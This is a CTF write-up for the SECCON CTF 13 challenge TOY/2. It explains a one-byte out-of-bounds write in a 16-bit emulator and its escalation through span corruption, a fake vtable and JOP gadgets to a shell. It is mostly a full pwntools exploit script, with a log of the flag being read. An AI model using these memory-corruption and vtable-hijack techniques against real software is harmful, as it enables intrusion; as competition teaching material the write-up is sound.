+++
title = 'TOY/2 - SECCON CTF 13'
date = 2024-11-24T14:53:47+01:00
draft = false
+++

## **TOY/2:**

this weekend we played as P1G SEKAI and managed to qualify to the finals. TOY/2 was a challenge I solved.

in this challenge we’re given a C++ binary that emulates some 16-bit architecture.

it had several instructions, one of them included an oob bug:

```cpp
case 13: /* STT */
    mem_write(_regs.a & (size() - 1), _regs.t);
    break;
```

this is bad code, since we write two bytes but the `AND` let’s us place those one byte before the emulator memory ends → one-byte oob write.

the memory uses `std::span<uint8_t>`, which has a pointer to the start of data right after its contents. we can elevate our oob privileges to also change the size of `_mem` to bypass checks.

```py
######################## overwrite ptr 

payload = b""
payload += _jmp(0x2)
payload += p16(0x8)
# user data
payload += p16((1 << 12) - 1)
payload += b"A\xd8"
#
payload += _lda(0x6) # 0x8
payload += _tat()
payload += _lda(0x4)
payload += _stt()

######################## padding and jump after move backward

payload += _tat()*11
payload += _jmp(0x30) # 0x2e
payload += p16(0x50)
payload += _tat()*3

######################## set length and corrupt ptr

payload += _jmp(0x12)
payload += p16(0x1c)
# user data
payload += p16(0xfe8) # 0x14
payload += p16(0x8000) # 0x16
payload += p16(0xfdf) # 0x18
payload += b"A\xb0" # 0x1a
#
payload += _lda(0x16) # 0x1c
payload += _tat()
payload += _lda(0x14) 
payload += _stt()

payload += _lda(0x1a)
payload += _tat()
payload += _lda(0x18)
payload += _stt()
```

with this we can also access data before `_mem`, which luckily contains a vtable pointer. this is called if we trigger an exception for example. given the vtable (pie) address and the heap address we’re able to retrieve, we can create a fake vtable on the heap and call whatever we want in the binary! I decided to call `_start`:

```py
######################## craft jumptable

payload += _jmp(0x56) # 0x54
payload += p16(0x6e) # 0x56

payload += p16(0x1008) # 0x58 # heap
payload += p16(0x100a) # 0x5a
payload += p16(0x100c) # 0x5c

payload += p16(0x0) # 0x5e # vtable
payload += p16(0x2) # 0x60
payload += p16(0x4) # 0x62

payload += p16(0x4000) # 0x64 # target
payload += p16(0x4002) # 0x66
payload += p16(0x4004) # 0x68

payload += p16(0x2020) # 0x6a # off _start
payload += p16(0x3ff8) # 0x6c # off heap
#

payload += _ldc(0x0) # 0x6e
payload += _sbc(0x6a)
payload += _tat()
payload += _lda(0x64)
payload += _stt()
payload += _lda(0x2)
payload += _tat()
payload += _lda(0x66)
payload += _stt()
payload += _lda(0x4)
payload += _tat()
payload += _lda(0x68)
payload += _stt()

payload += _ldc(0x58)
payload += _ldi()
payload += _adc(0x6c)
payload += _tat()
payload += _lda(0x5e)
payload += _stt()

payload += _lda(0x5a)
payload += _ldi()
payload += _tat()
payload += _lda(0x60)
payload += _stt()

payload += _lda(0x5c)
payload += _ldi()
payload += _tat()
payload += _lda(0x62)
payload += _stt()

payload += _ill()
```

why do we call `_start`? we don’t have good gadgets in the binary to do anything useful. however before we get another shot to input a program, there will be some `libstdc++` pointers on the heap. with a bit of work, we can also use them to calculate some gadgets and creating another fake vtable.

I decided to do some JOP, since we had control over the memory (vtable) pointed to by `rax`:

```c
1: mov r13, rax ; mov rax, qword ptr [rdi] ; call qword ptr [rax + 0x40]
2: mov rdi, r13 ; call qword ptr [rax + 0x48]
```

they worked quite well, since first (and only) vtable entry is called like this:

```c
<main+463>:	call   QWORD PTR [rax+0x8]
```

the only thing left is to place stuff correctly:

- `[rax]`: `/bin/sh` string
- `[rax+0x8]`: gadget 1 (see above)
- `[rax+0x40]`: gadget 2
- `[rax+0x48]`: `system()` address

this successfully calls `system("/bin/sh")` and we can read the flag.

```
root@bitpc:/pwd/Downloads/seccon# python3 x.py 
[+] Opening connection to toy-2.seccon.games on port 5000: Done
[*] Switching to interactive mode
[+] Running...
[-] Error: Illegal instruction
[+] Done.
[+] Running...
[-] Error: Illegal instruction
[+] Done.
$ cat /flag*
SECCON{Im4g1n3_pWn1n6_1n51d3_a_3um_CM0S}
$
```

(note: on remote the offset from `libc` to `libstdc++` didn’t match the local offset, so a little bruteforce was needed)

full exploit:
```py
from pwn import *

def _jmp(addr):
    return p16((addr & 0xfff))

def _adc(addr):
    return p16((0x1 << 12) | (addr & 0xfff))

def _xor(addr):
    return p16((0x2 << 12) | (addr & 0xfff))

def _sbc(addr):
    return p16((0x3 << 12) | (addr & 0xfff))

def _ror():
    return p16((0x4 << 12))

def _tat():
    return p16((0x5 << 12))

def _or(addr):
    return p16((0x6 << 12) | (addr & 0xfff))

def _ill():
    return p16((0x7 << 12))

def _and(addr):
    return p16((0x8 << 12) | (addr & 0xfff))

def _ldc(addr):
    return p16((0x9 << 12) | (addr & 0xfff))

def _bcc(addr):
    return p16((0xa << 12) | (addr & 0xfff))

def _bne(addr):
    return p16((0xb << 12) | (addr & 0xfff))

def _ldi():
    return p16((0xc << 12))

def _stt():
    return p16((0xd << 12))

def _lda(addr):
    return p16((0xe << 12) | (addr & 0xfff))

def _sta(addr):
    return p16((0xf << 12) | (addr & 0xfff))


p = remote("toy-2.seccon.games", 5000)

######################## overwrite ptr 

payload = b""
payload += _jmp(0x2)
payload += p16(0x8)
# user data
payload += p16((1 << 12) - 1)
payload += b"A\xd8"
#
payload += _lda(0x6) # 0x8
payload += _tat()
payload += _lda(0x4)
payload += _stt()

######################## padding and jump after move backward

payload += _tat()*11
payload += _jmp(0x30) # 0x2e
payload += p16(0x50)
payload += _tat()*3

######################## set length and corrupt ptr

payload += _jmp(0x12)
payload += p16(0x1c)
# user data
payload += p16(0xfe8) # 0x14
payload += p16(0x8000) # 0x16
payload += p16(0xfdf) # 0x18
payload += b"A\xb0" # 0x1a
#
payload += _lda(0x16) # 0x1c
payload += _tat()
payload += _lda(0x14) 
payload += _stt()

payload += _lda(0x1a)
payload += _tat()
payload += _lda(0x18)
payload += _stt()

######################## craft jumptable

payload += _jmp(0x56) # 0x54
payload += p16(0x6e) # 0x56

payload += p16(0x1008) # 0x58 # heap
payload += p16(0x100a) # 0x5a
payload += p16(0x100c) # 0x5c

payload += p16(0x0) # 0x5e # vtable
payload += p16(0x2) # 0x60
payload += p16(0x4) # 0x62

payload += p16(0x4000) # 0x64 # target
payload += p16(0x4002) # 0x66
payload += p16(0x4004) # 0x68

payload += p16(0x2020) # 0x6a # off _start
payload += p16(0x3ff8) # 0x6c # off heap
#

payload += _ldc(0x0) # 0x6e
payload += _sbc(0x6a)
payload += _tat()
payload += _lda(0x64)
payload += _stt()
payload += _lda(0x2)
payload += _tat()
payload += _lda(0x66)
payload += _stt()
payload += _lda(0x4)
payload += _tat()
payload += _lda(0x68)
payload += _stt()

payload += _ldc(0x58)
payload += _ldi()
payload += _adc(0x6c)
payload += _tat()
payload += _lda(0x5e)
payload += _stt()

payload += _lda(0x5a)
payload += _ldi()
payload += _tat()
payload += _lda(0x60)
payload += _stt()

payload += _lda(0x5c)
payload += _ldi()
payload += _tat()
payload += _lda(0x62)
payload += _stt()

payload += _ill()

######################## continue stage 2 payload

payload += _tat()*0x100
payload += _jmp(0x174) # 0x172
payload += p16(0x1b2)

payload += p16(0xf78) # 0x176 # libc
payload += p16(0xf7a) # 0x178
payload += p16(0xf7c) # 0x17a

payload += p16(0xfd8) # 0x17c # vtable
payload += p16(0xfda) # 0x17e
payload += p16(0xfdc) # 0x180

payload += p16(0x4000) # 0x182 # target
payload += p16(0x4002) # 0x184
payload += p16(0x4004) # 0x186

# mov rdi, r13 ; call qword ptr [rax + 0x48]
payload += p16(0x14) # 0x188 # off2
payload += p16(0x61c9) # 0x18a # off1
payload += p16(0x4130) # 0x18c # off heap

payload += p16(0x4040) # 0x18e # target
payload += p16(0x4042) # 0x190
payload += p16(0x4044) # 0x192

payload += p16(0x45) # 0x194 # off2 system
payload += p16(0x68b0) # 0x196 # off1 system

payload += p16(0x3ff8) # 0x198 # target
payload += p16(0x3ffa) # 0x19a
payload += p16(0x3ffc) # 0x19c
payload += p16(0x3ffe) # 0x19e

payload += b"/b" # 0x1a0
payload += b"in" # 0x1a2
payload += b"/s" # 0x1a4
payload += b"h\x00" # 0x1a6

# mov r13, rax ; mov rax, qword ptr [rdi] ; call qword ptr [rax + 0x40]
payload += p16(0x1b) # 0x1a8 # off2 
payload += p16(0x7024) # 0x1aa # off1 

payload += p16(0x4038) # 0x1ac # target
payload += p16(0x403a) # 0x1ae
payload += p16(0x403c) # 0x1b0

payload += _ldc(0xf78) # 0x1b2
payload += _sbc(0x18a)
payload += _tat()
payload += _lda(0x182)
payload += _stt()
payload += _lda(0xf7a)
payload += _sbc(0x188)
payload += _tat()
payload += _lda(0x184)
payload += _stt()
payload += _lda(0xf7c)
payload += _tat()
payload += _lda(0x186)
payload += _stt()

payload += _ldc(0xf78)
payload += _sbc(0x196)
payload += _tat()
payload += _lda(0x18e)
payload += _stt()
payload += _lda(0xf7a)
payload += _sbc(0x194)
payload += _tat()
payload += _lda(0x190)
payload += _stt()
payload += _lda(0xf7c)
payload += _tat()
payload += _lda(0x192)
payload += _stt()

payload += _ldc(0xf78)
payload += _sbc(0x1aa)
payload += _tat()
payload += _lda(0x1ac)
payload += _stt()
payload += _lda(0xf7a)
payload += _sbc(0x1a8)
payload += _tat()
payload += _lda(0x1ae)
payload += _stt()
payload += _lda(0xf7c)
payload += _tat()
payload += _lda(0x1b0)
payload += _stt()

payload += _ldc(0xed0)
payload += _adc(0x18c)
payload += _tat()
payload += _lda(0x17c)
payload += _stt()

payload += _lda(0xed2)
payload += _tat()
payload += _lda(0x17e)
payload += _stt()

payload += _lda(0xed4)
payload += _tat()
payload += _lda(0x180)
payload += _stt()

payload += _ldc(0x1a0)
payload += _tat()
payload += _lda(0x198)
payload += _stt()
payload += _lda(0x1a2)
payload += _tat()
payload += _lda(0x19a)
payload += _stt()
payload += _lda(0x1a4)
payload += _tat()
payload += _lda(0x19c)
payload += _stt()
payload += _lda(0x1a6)
payload += _tat()
payload += _lda(0x19e)
payload += _stt()

while(len(payload) < (1 << 12)):
    payload += _ill()

p.send(payload)

######################## overwrite ptr 

payload = b""
payload += _jmp(0x2)
payload += p16(0x8)
# user data
payload += p16((1 << 12) - 1)
payload += b"A\xe8"
#
payload += _lda(0x6) # 0x8
payload += _tat()
payload += _lda(0x4)
payload += _stt()

######################## padding and jump after move backward

payload += _tat()*16

######################## set length and corrupt ptr

payload += _jmp(0x12)
payload += p16(0x1c)
# user data
payload += p16(0xfe8) # 0x14
payload += p16(0x8000) # 0x16
payload += p16(0xfe1) # 0x18
payload += p16(0x10) # 0x1a
#
payload += _lda(0x16) # 0x1c
payload += _tat()
payload += _lda(0x14) 
payload += _stt()

payload += _ldc(0x18)
payload += _ldi()
payload += _sbc(0x1a)
payload += _tat()
payload += _lda(0x18)
payload += _stt()

while(len(payload) < (1 << 12)):
    payload += _ill()

p.send(payload)

p.interactive()
```